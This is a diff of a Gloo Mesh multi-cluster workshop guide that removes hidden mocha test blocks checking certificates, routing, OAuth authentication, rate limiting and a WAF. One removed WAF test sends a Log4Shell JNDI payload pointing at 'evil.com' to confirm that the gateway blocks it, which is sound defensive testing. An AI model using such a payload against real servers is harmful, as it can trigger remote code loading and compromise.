-    expect(cli).stderr.to.not.be.empty;
-  });
-
-  it('Gloo mesh is the organization for ' + process.env.CLUSTER2 + ' certificate', () => {
-    let cli = chaiExec("kubectl --context " + process.env.CLUSTER2 + " exec -t -n bookinfo-backends deploy/reviews-v1 -c istio-proxy -- openssl s_client -showcerts -connect ratings:9080 -alpn istio");
-
-    expect(cli).stdout.to.contain(expectedOutput);
-    expect(cli).stderr.to.not.be.empty;
-  });
-});
-EOF
-echo "executing test dist/gloo-mesh-2-0-eks-and-openshift/build/templates/steps/root-trust-policy/tests/certificate-issued-by-gloo-mesh.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
 
 You can see that the last certificate in the chain is now identical on both clusters. It's the new root certificate.
 
@@ -2073,36 +1625,6 @@ spec:
 EOF
 ```
 
-<!--bash
-cat <<'EOF' > ./test.js
-const chaiExec = require("@jsdevtools/chai-exec");
-var chai = require('chai');
-var expect = chai.expect;
-chai.use(chaiExec);
-
-afterEach(function (done) {
-  if (this.currentTest.currentRetry() > 0) {
-    process.stdout.write(".");
-    setTimeout(done, 1000);
-  } else {
-    done();
-  }
-});
-
-describe("Reviews v3", function() {
-  it('Got reviews v3', function () {
-    expect(process.env.ENDPOINT_HTTPS_GW_CLUSTER1).to.not.be.empty
-    let command = 'curl -ks "https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1 +'/productpage"'
-    let cli = chaiExec(command);
-    expect(cli).to.exit.with.code(0);
-    expect(cli).output.to.contain('color="red"');
-  })
-});
-EOF
-echo "executing test dist/gloo-mesh-2-0-eks-and-openshift/build/templates/steps/apps/bookinfo/multicluster-traffic/tests/reviews-v3.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
-
 If you refresh the page, you'll see the `v3` version of the `reviews` microservice:
 
 ![Bookinfo v3](images/steps/multicluster-traffic/bookinfo-v3.png)
@@ -2230,26 +1752,6 @@ Get the URL to access the `productpage` service from the second cluster using th
 echo "https://${ENDPOINT_HTTPS_GW_CLUSTER2}/productpage"
 ```
 
-<!--bash
-for i in {1..60}; do
-  nc -z $HOST_GW_CLUSTER1 443 && break
-  sleep 1
-done
--->
-
-<!--bash
-cat <<'EOF' > ./test.js
-const helpers = require('./tests/chai-http');
-
-describe("Productpage is available (SSL)", () => {
-  it('/productpage is available in cluster1', () => helpers.checkURL({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/productpage', retCode: 200 }));
-  it('/productpage is available in cluster2', () => helpers.checkURL({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER2, path: '/productpage', retCode: 200 }));
-})
-EOF
-echo "executing test dist/gloo-mesh-2-0-eks-and-openshift/build/templates/steps/apps/bookinfo/virtual-destination/tests/productpage-available-secure.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
-
 Now, if you try to access it from the first cluster, you can see that you now get the `v3` version of the `reviews` service (red stars).
 
 This diagram shows the flow of the request (through both Istio ingress gateways):
@@ -2334,19 +1836,6 @@ spec:
 EOF
 ```
 
-<!--bash
-cat <<'EOF' > ./test.js
-const helpers = require('./tests/chai-http');
-
-describe("Productpage is available (SSL)", () => {
-  it('/productpage is available in cluster1', () => helpers.checkURL({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/productpage', retCode: 200 }));
-  it('/productpage is available in cluster2', () => helpers.checkURL({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER2, path: '/productpage', retCode: 200 }));
-})
-EOF
-echo "executing test dist/gloo-mesh-2-0-eks-and-openshift/build/templates/steps/apps/bookinfo/virtual-destination/tests/productpage-available-secure.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
-
 Now, if you try to access the productpage from the first cluster, you should only get the `v1` and `v2` versions (the local ones).
 
 This updated diagram shows the flow of the requests using the local services:
@@ -2361,19 +1850,6 @@ Let's try this:
 kubectl --context ${CLUSTER1} -n bookinfo-frontends scale deploy/productpage-v1 --replicas=0
 kubectl --context ${CLUSTER1} -n bookinfo-frontends wait --for=jsonpath='{.spec.replicas}'=0 deploy/productpage-v1
 ```
-
-<!--bash
-cat <<'EOF' > ./test.js
-const helpers = require('./tests/chai-http');
-
-describe("Productpage is available (SSL)", () => {
-  it('/productpage is available in cluster1', () => helpers.checkURL({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/productpage', retCode: 200 }));
-  it('/productpage is available in cluster2', () => helpers.checkURL({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER2, path: '/productpage', retCode: 200 }));
-})
-EOF
-echo "executing test dist/gloo-mesh-2-0-eks-and-openshift/build/templates/steps/apps/bookinfo/virtual-destination/tests/productpage-available-secure.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
 
 You can still access the application on cluster1 even if the productpage isn't running there anymore. And you can see the `v3` version of the `reviews` service (red stars).
 
@@ -2398,19 +1874,6 @@ The following command will patch the deployment to run a new version which won't
 kubectl --context ${CLUSTER1} -n bookinfo-frontends patch deploy productpage-v1 --patch '{"spec": {"template": {"spec": {"containers": [{"name": "productpage","command": ["sleep", "20h"]}]}}}}'
 kubectl --context ${CLUSTER1} -n bookinfo-frontends rollout status deploy/productpage-v1
 ```
-
-<!--bash
-cat <<'EOF' > ./test.js
-const helpers = require('./tests/chai-http');
-
-describe("Productpage is available (SSL)", () => {
-  it('/productpage is available in cluster1', () => helpers.checkURL({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/productpage', retCode: 200 }));
-  it('/productpage is available in cluster2', () => helpers.checkURL({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER2, path: '/productpage', retCode: 200 }));
-})
-EOF
-echo "executing test dist/gloo-mesh-2-0-eks-and-openshift/build/templates/steps/apps/bookinfo/virtual-destination/tests/productpage-available-secure.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
 
 You can still access the bookinfo application.
 
@@ -2497,48 +1960,12 @@ kubectl --context ${CLUSTER1} -n httpbin debug -i -q ${pod} --image=curlimages/c
 
 You should get a `200` response code which confirm that the communication is currently allowed.
 
-<!--bash
-cat <<'EOF' > ./test.js
-var chai = require('chai');
-var expect = chai.expect;
-const helpers = require('./tests/chai-exec');
-
-describe("Communication allowed", () => {
-  it("Response code should be 200", () => {
-    const podName = helpers.getOutputForCommand({ command: "kubectl --context " + process.env.CLUSTER1 + " -n httpbin get pods -l app=not-in-mesh -o jsonpath='{.items[0].metadata.name}'" }).replaceAll("'", "");
-    const command = helpers.getOutputForCommand({ command: "kubectl --context " + process.env.CLUSTER1 + " -n httpbin debug -i -q " + podName + " --image=curlimages/curl -- curl -s -o /dev/null -w \"%{http_code}\" http://reviews.bookinfo-backends:9080/reviews/0" }).replaceAll("'", "");
-    expect(command).to.contain("200");
-  });
-});
-EOF
-echo "executing test dist/gloo-mesh-2-0-eks-and-openshift/build/templates/steps/apps/bookinfo/zero-trust/tests/not-in-mesh-to-in-mesh-allowed.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
-
 Run the following commands to initiate a communication from a service which is in the mesh to another service which is in the mesh:
 
 ```
 pod=$(kubectl --context ${CLUSTER1} -n httpbin get pods -l app=in-mesh -o jsonpath='{.items[0].metadata.name}')
 kubectl --context ${CLUSTER1} -n httpbin debug -i -q ${pod} --image=curlimages/curl -- curl -s -o /dev/null -w "%{http_code}" http://reviews.bookinfo-backends.svc.cluster.local:9080/reviews/0
 ```
-
-<!--bash
-cat <<'EOF' > ./test.js
-var chai = require('chai');
-var expect = chai.expect;
-const helpers = require('./tests/chai-exec');
-
-describe("Communication allowed", () => {
-  it("Response code should be 200", () => {
-    const podName = helpers.getOutputForCommand({ command: "kubectl --context " + process.env.CLUSTER1 + " -n httpbin get pods -l app=in-mesh -o jsonpath='{.items[0].metadata.name}'" }).replaceAll("'", "");
-    const command = helpers.getOutputForCommand({ command: "kubectl --context " + process.env.CLUSTER1 + " -n httpbin debug -i -q " + podName + " --image=curlimages/curl -- curl -s -o /dev/null -w \"%{http_code}\" http://reviews.bookinfo-backends:9080/reviews/0" }).replaceAll("'", "");
-    expect(command).to.contain("200");
-  });
-});
-EOF
-echo "executing test dist/gloo-mesh-2-0-eks-and-openshift/build/templates/steps/apps/bookinfo/zero-trust/tests/in-mesh-to-in-mesh-allowed.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
 
 You should get a `200` response code again.
 
@@ -2599,48 +2026,12 @@ kubectl --context ${CLUSTER1} -n httpbin debug -i -q ${pod} --image=curlimages/c
 
 You should get a `000` response code which means that the communication can't be established.
 
-<!--bash
-cat <<'EOF' > ./test.js
-var chai = require('chai');
-var expect = chai.expect;
-const helpers = require('./tests/chai-exec');
-
-describe("Communication notallowed", () => {
-  it("Response code should be 000", () => {
-    const podName = helpers.getOutputForCommand({ command: "kubectl --context " + process.env.CLUSTER1 + " -n httpbin get pods -l app=not-in-mesh -o jsonpath='{.items[0].metadata.name}'" }).replaceAll("'", "");
-    const command = helpers.getOutputForCommand({ command: "kubectl --context " + process.env.CLUSTER1 + " -n httpbin debug -i -q " + podName + " --image=curlimages/curl -- curl -s -o /dev/null -w \"%{http_code}\" http://reviews.bookinfo-backends:9080/reviews/0" }).replaceAll("'", "");
-    expect(command).to.contain("000");
-  });
-});
-EOF
-echo "executing test dist/gloo-mesh-2-0-eks-and-openshift/build/templates/steps/apps/bookinfo/zero-trust/tests/not-in-mesh-to-in-mesh-not-allowed.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
-
 Run the following commands to initiate a communication from a service which is in the mesh to another service which is in the mesh:
 
 ```
 pod=$(kubectl --context ${CLUSTER1} -n httpbin get pods -l app=in-mesh -o jsonpath='{.items[0].metadata.name}')
 kubectl --context ${CLUSTER1} -n httpbin debug -i -q ${pod} --image=curlimages/curl -- curl -s -o /dev/null -w "%{http_code}" http://reviews.bookinfo-backends.svc.cluster.local:9080/reviews/0
 ```
-
-<!--bash
-cat <<'EOF' > ./test.js
-var chai = require('chai');
-var expect = chai.expect;
-const helpers = require('./tests/chai-exec');
-
-describe("Communication not allowed", () => {
-  it("Response code should be 403", () => {
-    const podName = helpers.getOutputForCommand({ command: "kubectl --context " + process.env.CLUSTER1 + " -n httpbin get pods -l app=in-mesh -o jsonpath='{.items[0].metadata.name}'" }).replaceAll("'", "");
-    const command = helpers.getOutputForCommand({ command: "kubectl --context " + process.env.CLUSTER1 + " -n httpbin debug -i -q " + podName + " --image=curlimages/curl -- curl -s -o /dev/null -w \"%{http_code}\" http://reviews.bookinfo-backends:9080/reviews/0" }).replaceAll("'", "");
-    expect(command).to.contain("403");
-  });
-});
-EOF
-echo "executing test dist/gloo-mesh-2-0-eks-and-openshift/build/templates/steps/apps/bookinfo/zero-trust/tests/in-mesh-to-in-mesh-not-allowed.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
 
 You should get a `403` response code which means that the sidecar proxy of the `reviews` service doesn't allow the request.
 
@@ -2771,18 +2162,6 @@ spec:
 EOF
 ```
 
-<!--bash
-cat <<'EOF' > ./test.js
-const helpersHttp = require('./tests/chai-http');
-
-describe("httpbin from the external service", () => {
-  it('Checking text \'X-Amzn-Trace-Id\' in ' + process.env.CLUSTER1, () => helpersHttp.checkBody({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/get', body: 'X-Amzn-Trace-Id', match: true }));
-})
-EOF
-echo "executing test dist/gloo-mesh-2-0-eks-and-openshift/build/templates/steps/apps/httpbin/gateway-external-service/tests/httpbin-from-external.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
-
 You should now be able to access `httpbin.org` external service through the gateway.
 
 Get the URL to access the `httpbin` service using the following command:
@@ -2832,29 +2211,6 @@ spec:
 EOF
 ```
 
-<!--bash
-cat <<'EOF' > ./test.js
-const helpersHttp = require('./tests/chai-http');
-
-describe("httpbin from the local service", () => {
-  it('Checking text \'X-B3-Parentspanid\' in ' + process.env.CLUSTER1, () => helpersHttp.checkBody({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/get', body: 'X-B3-Parentspanid', match: true }));
-})
-EOF
-echo "executing test dist/gloo-mesh-2-0-eks-and-openshift/build/templates/steps/apps/httpbin/gateway-external-service/tests/httpbin-from-local.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
-<!--bash
-cat <<'EOF' > ./test.js
-const helpersHttp = require('./tests/chai-http');
-
-describe("httpbin from the external service", () => {
-  it('Checking text \'X-Amzn-Trace-Id\' in ' + process.env.CLUSTER1, () => helpersHttp.checkBody({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/get', body: 'X-Amzn-Trace-Id', match: true }));
-})
-EOF
-echo "executing test dist/gloo-mesh-2-0-eks-and-openshift/build/templates/steps/apps/httpbin/gateway-external-service/tests/httpbin-from-external.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
-
 If you refresh your browser, you should see that you get a response either from the local service or from the external service.
 
 When the response comes from the external service (httpbin.org), there's a `X-Amzn-Trace-Id` header.
@@ -2895,18 +2251,6 @@ spec:
 EOF
 ```
 
-<!--bash
-cat <<'EOF' > ./test.js
-const helpersHttp = require('./tests/chai-http');
-
-describe("httpbin from the local service", () => {
-  it('Checking text \'X-B3-Parentspanid\' in ' + process.env.CLUSTER1, () => helpersHttp.checkBody({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/get', body: 'X-B3-Parentspanid', match: true }));
-})
-EOF
-echo "executing test dist/gloo-mesh-2-0-eks-and-openshift/build/templates/steps/apps/httpbin/gateway-external-service/tests/httpbin-from-local.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
-
 If you refresh your browser, you should see that you get responses only from the local service.
 
 This diagram shows the flow of the requests :
@@ -2934,46 +2278,6 @@ cat data/steps/deploy-keycloak/keycloak.yaml | kubectl --context ${MGMT} -n keyc
 kubectl --context ${MGMT} -n keycloak rollout status deploy/keycloak
 ```
 
-<!--bash
-cat <<'EOF' > ./test.js
-const helpers = require('./tests/chai-exec');
-
-describe("Keycloak", () => {
-  it('keycloak pods are ready in cluster1', () => helpers.checkDeployment({ context: process.env.MGMT, namespace: "keycloak", k8sObj: "keycloak" }));
-});
-EOF
-echo "executing test dist/gloo-mesh-2-0-eks-and-openshift/build/templates/steps/deploy-keycloak/tests/pods-available.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
-
-<!--bash
-cat <<'EOF' > ./test.js
-const chaiExec = require("@jsdevtools/chai-exec");
-var chai = require('chai');
-var expect = chai.expect;
-chai.use(chaiExec);
-
-afterEach(function (done) {
-  if (this.currentTest.currentRetry() > 0) {
-    process.stdout.write(".");
-    setTimeout(done, 1000);
-  } else {
-    done();
-  }
-});
-
-describe("Retrieve enterprise-networking ip", () => {
-  it("A value for load-balancing has been assigned", () => {
-    let cli = chaiExec("kubectl --context " + process.env.MGMT + " -n keycloak get svc keycloak -o jsonpath='{.status.loadBalancer}'");
-    expect(cli).to.exit.with.code(0);
-    expect(cli).output.to.contain('"ingress"');
-  });
-});
-EOF
-echo "executing test dist/gloo-mesh-2-0-eks-and-openshift/build/templates/steps/deploy-keycloak/tests/keycloak-ip-is-attached.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
-
 Then, we will configure it and create two users:
 
 - User1 credentials: `user1/password`
@@ -2981,12 +2285,6 @@ Then, we will configure it and create two users:
 
 - User2 credentials: `user2/password`
   Email: user2@solo.io
-
-<!--bash
-until [[ $(kubectl --context ${MGMT} -n keycloak get svc keycloak -o json | jq '.status.loadBalancer | length') -gt 0 ]]; do
-  sleep 1
-done
--->
 
 Let's set the environment variables we need:
 
@@ -2996,30 +2294,6 @@ export HOST_KEYCLOAK=$(echo ${ENDPOINT_KEYCLOAK} | cut -d: -f1)
 export PORT_KEYCLOAK=$(echo ${ENDPOINT_KEYCLOAK} | cut -d: -f2)
 export KEYCLOAK_URL=http://${ENDPOINT_KEYCLOAK}/auth
 ```
-
-<!--bash
-cat <<'EOF' > ./test.js
-const dns = require('dns');
-const chaiHttp = require("chai-http");
-const chai = require("chai");
-const expect = chai.expect;
-chai.use(chaiHttp);
-const { waitOnFailedTest } = require('./tests/utils');
-
-afterEach(function(done) { waitOnFailedTest(done, this.currentTest.currentRetry())});
-
-describe("Address '" + process.env.HOST_KEYCLOAK + "' can be resolved in DNS", () => {
-    it(process.env.HOST_KEYCLOAK + ' can be resolved', (done) => {
-        return dns.lookup(process.env.HOST_KEYCLOAK, (err, address, family) => {
-            expect(address).to.be.an.ip;
-            done();
-        });
-    });
-});
-EOF
-echo "executing test ./gloo-mesh/tests/can-resolve.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
 
 Now, we need to get a token:
 
@@ -3179,30 +2453,6 @@ spec:
             number: 8000
 EOF
 ```
-
-<!--bash
-cat <<'EOF' > ./test.js
-const chaiExec = require("@jsdevtools/chai-exec");
-const helpersHttp = require('./tests/chai-http');
-var chai = require('chai');
-var expect = chai.expect;
-
-describe("Authentication is working properly", function() {
-  let user = 'user2';
-  let password = 'password';
-  let keycloak_client_id = chaiExec("kubectl --context " + process.env.CLUSTER1 + " -n httpbin get extauthpolicy httpbin -o jsonpath='{.spec.config.glooAuth.configs[0].oauth2.oidcAuthorizationCode.clientId}'").stdout.replaceAll("'", "");
-  let keycloak_client_secret_base64 = chaiExec("kubectl --context " + process.env.CLUSTER1 + " -n httpbin get secret oauth -o jsonpath='{.data.client-secret}'").stdout.replaceAll("'", "");
-  let buff = new Buffer(keycloak_client_secret_base64, 'base64');
-  let keycloak_client_secret = buff.toString('ascii');
-  let keycloak_token = JSON.parse(chaiExec('curl -d "client_id=' + keycloak_client_id + '" -d "client_secret=' + keycloak_client_secret + '" -d "scope=openid" -d "username=' + user + '" -d "password=' + password + '" -d "grant_type=password" "' + process.env.KEYCLOAK_URL +'/realms/master/protocol/openid-connect/token"').stdout.replaceAll("'", "")).id_token;
-  it("The httpbin page isn't accessible without authenticating", () => helpersHttp.checkURL({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/get', retCode: 302 }));
-  it("The httpbin page is accessible after authenticating", () => helpersHttp.checkURL({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/get', headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], retCode: 200 }));
-});
-
-EOF
-echo "executing test dist/gloo-mesh-2-0-eks-and-openshift/build/templates/steps/apps/httpbin/gateway-extauth-oauth/tests/authentication.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
 
 If you refresh the web browser, you will be redirected to the authentication page.
 
@@ -3382,30 +2632,6 @@ You can see that it will be applied to our existing route and also that we want 
 
 If you refresh the web page, you should see a new `X-Email` header added to the request with the value `user2@solo.io`
 
-<!--bash
-cat <<'EOF' > ./test.js
-const chaiExec = require("@jsdevtools/chai-exec");
-const helpersHttp = require('./tests/chai-http');
-var chai = require('chai');
-var expect = chai.expect;
-
-describe("Claim to header is working properly", function() {
-  let user = 'user2';
-  let password = 'password';
-  let keycloak_client_id = chaiExec("kubectl --context " + process.env.CLUSTER1 + " -n httpbin get extauthpolicy httpbin -o jsonpath='{.spec.config.glooAuth.configs[0].oauth2.oidcAuthorizationCode.clientId}'").stdout.replaceAll("'", "");
-  let keycloak_client_secret_base64 = chaiExec("kubectl --context " + process.env.CLUSTER1 + " -n httpbin get secret oauth -o jsonpath='{.data.client-secret}'").stdout.replaceAll("'", "");
-  let buff = new Buffer(keycloak_client_secret_base64, 'base64');
-  let keycloak_client_secret = buff.toString('ascii');
-  let keycloak_token = JSON.parse(chaiExec('curl -d "client_id=' + keycloak_client_id + '" -d "client_secret=' + keycloak_client_secret + '" -d "scope=openid" -d "username=' + user + '" -d "password=' + password + '" -d "grant_type=password" "' + process.env.KEYCLOAK_URL +'/realms/master/protocol/openid-connect/token"').stdout.replaceAll("'", "")).id_token;
-  it('The new header has been added', () => helpersHttp.checkBody({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/get', headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], body: '"X-Email": "user2@solo.io"' }));
-});
-
-EOF
-echo "executing test dist/gloo-mesh-2-0-eks-and-openshift/build/templates/steps/apps/httpbin/gateway-jwt/tests/header-added.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
-
-
 
 ## Lab 19 - Use the transformation filter to manipulate headers <a name="Lab-19"></a>
 
@@ -3446,30 +2672,6 @@ EOF
 You can see that it will be applied to our existing route and also that we want to execute it after performing the external authentication (to have access to the JWT token).
 
 If you refresh the web page, you should see a new `X-Organization` header added to the request with the value `solo.io`
-
-<!--bash
-cat <<'EOF' > ./test.js
-const chaiExec = require("@jsdevtools/chai-exec");
-const helpersHttp = require('./tests/chai-http');
-var chai = require('chai');
-var expect = chai.expect;
-
-describe("Tranformation is working properly", function() {
-  let user = 'user2';
-  let password = 'password';
-  let keycloak_client_id = chaiExec("kubectl --context " + process.env.CLUSTER1 + " -n httpbin get extauthpolicy httpbin -o jsonpath='{.spec.config.glooAuth.configs[0].oauth2.oidcAuthorizationCode.clientId}'").stdout.replaceAll("'", "");
-  let keycloak_client_secret_base64 = chaiExec("kubectl --context " + process.env.CLUSTER1 + " -n httpbin get secret oauth -o jsonpath='{.data.client-secret}'").stdout.replaceAll("'", "");
-  let buff = new Buffer(keycloak_client_secret_base64, 'base64');
-  let keycloak_client_secret = buff.toString('ascii');
-  let keycloak_token = JSON.parse(chaiExec('curl -d "client_id=' + keycloak_client_id + '" -d "client_secret=' + keycloak_client_secret + '" -d "scope=openid" -d "username=' + user + '" -d "password=' + password + '" -d "grant_type=password" "' + process.env.KEYCLOAK_URL +'/realms/master/protocol/openid-connect/token"').stdout.replaceAll("'", "")).id_token;
-  it('The new header has been added', () => helpersHttp.checkBody({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/get', headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], body: '"X-Organization": "solo.io"' }));
-});
-
-EOF
-echo "executing test dist/gloo-mesh-2-0-eks-and-openshift/build/templates/steps/apps/httpbin/gateway-transformation/tests/header-added.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
-
 
 
 ## Lab 20 - Apply rate limiting to the Gateway <a name="Lab-20"></a>
@@ -3618,29 +2820,6 @@ EOF
 
 Refresh the web page multiple times.
 
-<!--bash
-cat <<'EOF' > ./test.js
-const chaiExec = require("@jsdevtools/chai-exec");
-const helpersHttp = require('./tests/chai-http');
-var chai = require('chai');
-var expect = chai.expect;
-
-describe("Rate limiting is working properly", function() {
-  let user = 'user2';
-  let password = 'password';
-  let keycloak_client_id = chaiExec("kubectl --context " + process.env.CLUSTER1 + " -n httpbin get extauthpolicy httpbin -o jsonpath='{.spec.config.glooAuth.configs[0].oauth2.oidcAuthorizationCode.clientId}'").stdout.replaceAll("'", "");
-  let keycloak_client_secret_base64 = chaiExec("kubectl --context " + process.env.CLUSTER1 + " -n httpbin get secret oauth -o jsonpath='{.data.client-secret}'").stdout.replaceAll("'", "");
-  let buff = new Buffer(keycloak_client_secret_base64, 'base64');
-  let keycloak_client_secret = buff.toString('ascii');
-  let keycloak_token = JSON.parse(chaiExec('curl -d "client_id=' + keycloak_client_id + '" -d "client_secret=' + keycloak_client_secret + '" -d "scope=openid" -d "username=' + user + '" -d "password=' + password + '" -d "grant_type=password" "' + process.env.KEYCLOAK_URL +'/realms/master/protocol/openid-connect/token"').stdout.replaceAll("'", "")).id_token;
-  it('The httpbin page should be rate limited', () => helpersHttp.checkURL({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/get', headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], retCode: 429 }));
-});
-
-EOF
-echo "executing test dist/gloo-mesh-2-0-eks-and-openshift/build/templates/steps/apps/httpbin/gateway-ratelimiting/tests/rate-limited.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
-
 You should get a `200` response code the first 3 time and a `429` response code after.
 
 This diagram shows the flow of the request (with the Istio ingress gateway leveraging the `rate limiter` Pod to determine if the request should be allowed):
@@ -3771,22 +2950,6 @@ spec:
 EOF
 ```
 
-<!--bash
-cat <<'EOF' > ./test.js
-const chaiExec = require("@jsdevtools/chai-exec");
-const helpersHttp = require('./tests/chai-http');
-var chai = require('chai');
-var expect = chai.expect;
-
-describe("WAF is working properly", function() {
-  it('The request has been blocked', () => helpersHttp.checkBody({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/get', headers: [{key: 'x-my-header', value: '${jndi:ldap://evil.com/x}'}], body: 'Log4Shell malicious payload' }));
-});
-
-EOF
-echo "executing test dist/gloo-mesh-2-0-eks-and-openshift/build/templates/steps/apps/httpbin/gateway-waf/tests/waf.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
-
 Run the following command to simulate an attack:
 
 ```bash
@@ -3844,5 +3007,3 @@ And also delete the waf policy we've created:
 ```bash
 kubectl --context ${CLUSTER1} -n httpbin delete wafpolicies.security.policy.gloo.solo.io log4shell
 ```
-
-
